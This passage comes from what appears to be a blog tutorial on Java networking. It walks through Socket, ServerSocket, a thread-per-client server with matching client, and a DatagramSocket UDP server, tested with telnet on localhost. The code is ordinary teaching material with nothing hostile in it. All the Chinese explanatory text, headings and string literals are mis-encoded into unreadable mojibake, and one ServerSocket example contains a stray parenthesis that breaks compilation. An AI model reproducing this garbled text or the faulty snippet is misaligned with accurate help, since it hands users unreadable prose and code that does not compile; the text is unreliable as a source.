<code>IOException</code> å¼‚å¸¸ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¥—æ¥å­—åœ¨å»ºç«‹çš„æ—¶å€™ï¼Œå¦‚æœè¿œç¨‹ä¸»æœºä¸å¯è®¿é—®ï¼Œè¿™æ®µä»£ç å°±ä¼šé˜»å¡å¾ˆé•¿æ—¶é—´ï¼Œç›´åˆ°åº•å±‚æ“ä½œç³»ç»Ÿçš„é™åˆ¶è€ŒæŠ›å‡ºå¼‚å¸¸ã€‚æ‰€ä»¥ä¸€èˆ¬ä¼šåœ¨å¥—æ¥å­—å»ºç«‹åè®¾ç½®ä¸€ä¸ªè¶…æ—¶æ—¶é—´ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(...);</span><br><span class="line">socket.setSoTimeout(<span class="number">10000</span>); <span class="comment">// å•ä½ä¸ºæ¯«ç§’</span></span><br></pre></td></tr></table></figure><p>2ï¼‰å¥—æ¥å­—è¿æ¥æˆåŠŸåï¼Œå¯ä»¥é€šè¿‡ <code>java.net.Socket</code> ç±»çš„ <code>getInputStream()</code> æ–¹æ³•è·å–è¾“å…¥æµã€‚æœ‰äº† <code>InputStream</code> å¯¹è±¡åï¼Œå¯ä»¥å€ŸåŠ©æ–‡æœ¬æ‰«æå™¨ç±»ï¼ˆScannerï¼‰å°†å…¶ä¸­çš„å†…å®¹æ‰“å°å‡ºæ¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(is, <span class="string">&quot;gbk&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (scanner.hasNextLine()) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line">    System.out.println(line);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ServerSocket-å®ä¾‹"><a href="#ServerSocket-å®ä¾‹" class="headerlink" title="ServerSocket å®ä¾‹"></a>ServerSocket å®ä¾‹</h3><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¨¡æ‹Ÿä¸€ä¸ªè¿œç¨‹æœåŠ¡ï¼Œé€šè¿‡ <code>java.net.ServerSocket</code> å®ç°ã€‚ä»£ç ç¤ºä¾‹å¦‚ä¸‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">ServerSocket</span> <span class="variable">server</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(<span class="number">8888</span>);</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> server.accept();</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line"></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(is)) </span><br><span class="line">    <span class="type">PrintWriter</span> <span class="variable">pw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(<span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(os, <span class="string">&quot;gbk&quot;</span>), <span class="literal">true</span>);</span><br><span class="line">    pw.println(<span class="string">&quot;ä½ å¥½å•Šï¼Œæ¬¢è¿å…³æ³¨ã€Œæ²‰é»˜ç‹äºŒã€ å…¬ä¼—å·ï¼Œå›å¤å…³é”®å­—ã€Œ2048ã€ é¢†å–ç¨‹åºå‘˜è¿›é˜¶å¿…è¯»èµ„æ–™åŒ…&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">done</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">while</span> (!done &amp;&amp; scanner.hasNextLine()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line">        System.out.println(line);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;2048&quot;</span>.equals(line)) &#123;</span><br><span class="line">            done = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (UnknownHostException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1ï¼‰å»ºç«‹æœåŠ¡å™¨ç«¯çš„å¥—æ¥å­—ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œåªéœ€è¦æŒ‡å®šä¸€ä¸ªèƒ½å¤Ÿç‹¬å çš„ç«¯å£å·å°±å¯ä»¥äº†ï¼ˆ0~1023 è¿™äº›ç«¯å£éƒ½å·²ç»è¢«ç³»ç»Ÿé¢„ç•™äº†ï¼‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServerSocket</span> <span class="variable">server</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(<span class="number">8888</span>);</span><br></pre></td></tr></table></figure><p>2ï¼‰è°ƒç”¨ ServerSocket å¯¹è±¡çš„ <code>accept()</code> ç­‰å¾…å®¢æˆ·ç«¯å¥—æ¥å­—çš„è¿æ¥è¯·æ±‚ã€‚ä¸€æ—¦ç›‘å¬åˆ°å®¢æˆ·ç«¯çš„å¥—æ¥å­—è¯·æ±‚ï¼Œå°±ä¼šè¿”å›ä¸€ä¸ªè¡¨ç¤ºè¿æ¥å·²å»ºç«‹çš„ Socket å¯¹è±¡ï¼Œå¯ä»¥ä»ä¸­è·å–åˆ°è¾“å…¥æµå’Œè¾“å‡ºæµã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> server.accept();</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line"><span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> socket.getOutputStream();</span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯å¥—æ¥å­—å‘é€çš„æ‰€æœ‰ä¿¡æ¯éƒ½ä¼šåŒ…è£¹åœ¨æœåŠ¡å™¨ç«¯å¥—æ¥å­—çš„è¾“å…¥æµä¸­ï¼›è€ŒæœåŠ¡å™¨ç«¯å¥—æ¥å­—å‘é€çš„æ‰€æœ‰ä¿¡æ¯éƒ½ä¼šåŒ…è£¹åœ¨å®¢æˆ·ç«¯å¥—æ¥å­—çš„è¾“å‡ºæµä¸­ã€‚</p><p>3ï¼‰æœåŠ¡å™¨ç«¯å¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç å‘å®¢æˆ·ç«¯å‘é€æ¶ˆæ¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PrintWriter</span> <span class="variable">pw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(<span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(os, <span class="string">&quot;gbk&quot;</span>), <span class="literal">true</span>);</span><br><span class="line">pw.println(<span class="string">&quot;ä½ å¥½å•Šï¼Œæ¬¢è¿å…³æ³¨ã€Œæ²‰é»˜ç‹äºŒã€ å…¬ä¼—å·ï¼Œå›å¤å…³é”®å­—ã€Œ2048ã€ é¢†å–ç¨‹åºå‘˜è¿›é˜¶å¿…è¯»èµ„æ–™åŒ…&quot;</span>);</span><br></pre></td></tr></table></figure><p>4ï¼‰æœåŠ¡å™¨ç«¯å¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç è¯»å–å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„æ¶ˆæ¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(is);</span><br><span class="line"><span class="type">boolean</span> <span class="variable">done</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">while</span> (!done &amp;&amp; scanner.hasNextLine()) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line">    System.out.println(line);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;2048&quot;</span>.equals(line)) &#123;</span><br><span class="line">        done = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œè¯¥æœåŠ¡åï¼Œå¯ä»¥é€šè¿‡ <code>telnet localhost 8888</code> å‘½ä»¤è¿æ¥è¯¥è¿œç¨‹æœåŠ¡ï¼Œä¸å‡ºæ‰€æ–™ï¼Œä½ å°†ä¼šçœ‹åˆ°ä»¥ä¸‹ä¿¡æ¯ã€‚<br><img src="/2024/11/01/code/javanetwork/image-3.png"></p><h3 id="04ã€ä¸ºå¤šä¸ªå®¢æˆ·ç«¯æœåŠ¡"><a href="#04ã€ä¸ºå¤šä¸ªå®¢æˆ·ç«¯æœåŠ¡" class="headerlink" title="04ã€ä¸ºå¤šä¸ªå®¢æˆ·ç«¯æœåŠ¡"></a>04ã€ä¸ºå¤šä¸ªå®¢æˆ·ç«¯æœåŠ¡</h3><p>éå¸¸é—æ†¾çš„æ˜¯ï¼Œä¸Šé¢çš„ä¾‹å­ä¸­ï¼ŒæœåŠ¡å™¨ç«¯åªèƒ½ä¸ºä¸€ä¸ªå®¢æˆ·ç«¯æœåŠ¡â€”â€”è¿™ä¸ç¬¦åˆæœåŠ¡å™¨ç«¯ä¸€å¯¹å¤šçš„è¦æ±‚ã€‚<br>ä¼˜åŒ–æ–¹æ¡ˆä¹Ÿéå¸¸ç®€å•ï¼ˆä½ åº”è¯¥ä¹Ÿèƒ½æƒ³å¾—åˆ°ï¼‰ï¼šæœåŠ¡å™¨ç«¯æ¥æ”¶åˆ°å®¢æˆ·ç«¯çš„å¥—æ¥å­—è¯·æ±‚æ—¶ï¼Œå¯ä»¥å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹æ¥å¤„ç†ï¼Œè€Œä¸»ç¨‹åºç»§ç»­ç­‰å¾…ä¸‹ä¸€ä¸ªè¿æ¥ã€‚ä»£ç ç¤ºä¾‹å¦‚ä¸‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> (<span class="type">ServerSocket</span> <span class="variable">server</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(<span class="number">8888</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> server.accept();</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">              <span class="comment">// å¥—æ¥å­—å¤„ç†ç¨‹åº</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread.start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çº¿ç¨‹å†…éƒ¨ï¼ˆ<code>run()&#123;&#125;</code> æ–¹æ³•é‡Œï¼‰ç”¨æ¥å¤„ç†å¥—æ¥å­—ï¼Œä»£ç ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line">    <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(is);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// å…¶ä»–ä»£ç çœç•¥</span></span><br><span class="line">   <span class="comment">// å‘å®¢æˆ·ç«¯å‘é€æ¶ˆæ¯</span></span><br><span class="line">   <span class="comment">// è¯»å–å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„æ¶ˆæ¯</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        socket.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœåŠ¡å™¨ç«¯ä»£ç ä¼˜åŒ–åé‡æ–°è¿è¡Œï¼Œä½ å°±å¯ä»¥é€šè¿‡ telnet å‘½ä»¤æµ‹è¯•äº†ã€‚æ‰“å¼€ä¸€ä¸ªå‘½ä»¤è¡Œçª—å£è¾“å…¥ <code>telnet localhost 8888</code>ï¼Œå†æ‰“å¼€ä¸€ä¸ªæ–°çš„å‘½ä»¤è¡Œçª—å£è¾“å…¥ <code>telnet localhost 8888</code>ï¼Œå¤šä¸ªçª—å£éƒ½å¯ä»¥å’ŒæœåŠ¡å™¨ç«¯è¿›è¡Œé€šä¿¡ï¼Œé™¤éæœåŠ¡å™¨ç«¯ä»£ç ä¸­æ–­è¿è¡Œã€‚</p><h3 id="05ã€åŠ å…¥å¤šçº¿ç¨‹"><a href="#05ã€åŠ å…¥å¤šçº¿ç¨‹" class="headerlink" title="05ã€åŠ å…¥å¤šçº¿ç¨‹"></a>05ã€åŠ å…¥å¤šçº¿ç¨‹</h3><p><a href="https://javabetter.cn/thread/wangzhe-thread.html">å¤šçº¿ç¨‹</a>æˆ‘ä»¬åé¢ä¼šè¯¦ç»†è®²ï¼Œè¿™é‡Œå°±ä¸»è¦æ˜¯å†™ä¸ªä¾‹å­ï¼Œå¥½è®©å¤§å®¶æ„Ÿè§‰æ›´æœ‰è¶£ä¸€äº›ï¼Œå…¶å®ä¹Ÿéå¸¸ç®€å•ã€‚</p><p>æ¥çœ‹æœåŠ¡ç«¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MultiThreadedServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">12345</span>;</span><br><span class="line">        <span class="type">ServerSocket</span> <span class="variable">serverSocket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(port);</span><br><span class="line">        System.out.println(<span class="string">&quot;Server is listening on port &quot;</span> + port);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> serverSocket.accept();</span><br><span class="line">            System.out.println(<span class="string">&quot;Client connected&quot;</span>);</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ClientHandler</span>(socket).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClientHandler</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Socket socket;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClientHandler</span><span class="params">(Socket socket)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.socket = socket;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">input</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(input));</span><br><span class="line"></span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">output</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(output, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Received: &quot;</span> + line);</span><br><span class="line">                writer.println(<span class="string">&quot;Server: &quot;</span> + line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            socket.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Client disconnected&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ä¸€ä¸ª ClientHandler ç±»ï¼Œè¯¥ç±»ç»§æ‰¿è‡ª Thread ç±»ã€‚è¿™ä½¿å¾—æ¯ä¸ªå®¢æˆ·ç«¯è¿æ¥éƒ½å¯ä»¥åœ¨å•ç‹¬çš„çº¿ç¨‹ä¸­å¤„ç†ï¼Œä»è€Œå…è®¸æœåŠ¡å™¨åŒæ—¶å¤„ç†å¤šä¸ªå®¢æˆ·ç«¯è¿æ¥ã€‚å½“ä¸€ä¸ªæ–°å®¢æˆ·ç«¯è¿æ¥åˆ°æœåŠ¡å™¨æ—¶ï¼ŒæœåŠ¡å™¨ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ ClientHandler å¯¹è±¡ï¼Œå¹¶ä½¿ç”¨ <code>start()</code> æ–¹æ³•å¯åŠ¨çº¿ç¨‹ã€‚ClientHandler ç±»çš„ <code>run()</code> æ–¹æ³•åŒ…å«å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚çš„é€»è¾‘ã€‚</p><p>æ¥çœ‹å®¢æˆ·ç«¯ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hostname</span> <span class="operator">=</span> <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">12345</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(hostname, port);</span><br><span class="line">        System.out.println(<span class="string">&quot;Connected to the server&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">input</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(input));</span><br><span class="line"></span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">output</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(output, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        writer.println(<span class="string">&quot;Hello, server!&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">response</span> <span class="operator">=</span> reader.readLine();</span><br><span class="line">        System.out.println(<span class="string">&quot;Server response: &quot;</span> + response);</span><br><span class="line"></span><br><span class="line">        socket.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="08ã€DatagramSocket-å®ä¾‹"><a href="#08ã€DatagramSocket-å®ä¾‹" class="headerlink" title="08ã€DatagramSocket å®ä¾‹"></a>08ã€DatagramSocket å®ä¾‹</h3><p>DatagramSocket ç±»æ˜¯ Java ä¸­å®ç° UDP åè®®çš„æ ¸å¿ƒç±»ã€‚ä¸åŸºäº TCP çš„ Socket å’Œ ServerSocket ç±»ä¸åŒï¼ŒDatagramSocket ç±»æä¾›äº†æ— è¿æ¥çš„é€šä¿¡æœåŠ¡ï¼Œå‘é€å’Œæ¥æ”¶æ•°æ®åŒ…ã€‚ç”±äºæ— éœ€å»ºç«‹è¿æ¥ï¼ŒUDP é€šå¸¸æ¯” TCP æ›´å¿«ï¼Œä½†å¯èƒ½ä¸å¦‚ TCP å¯é ã€‚<br>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ DatagramSocket ç¤ºä¾‹ï¼Œå±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨ UDP åè®®åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´å‘é€å’Œæ¥æ”¶æ¶ˆæ¯ã€‚</p><p>æœåŠ¡å™¨ç«¯ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramPacket;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramSocket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UDPServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">12345</span>;</span><br><span class="line">        <span class="type">DatagramSocket</span> <span class="variable">serverSocket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>(port);</span><br><span class="line">        System.out.println(<span class="string">&quot;Server is listening on port &quot;</span> + port);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">DatagramPacket</span> <span class="variable">packet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(buffer, buffer.length);</span><br><span class="line"></span><br><span class="line">        serverSocket.receive(packet);</span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(packet.getData(), <span class="number">0</span>, packet.getLength());</span><br><span class="line">        System.out.println(<span class="string">&quot;Received: &quot;</span> + message);</span><br><span class="line"></span><br><span class="line">        serverSocket.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> 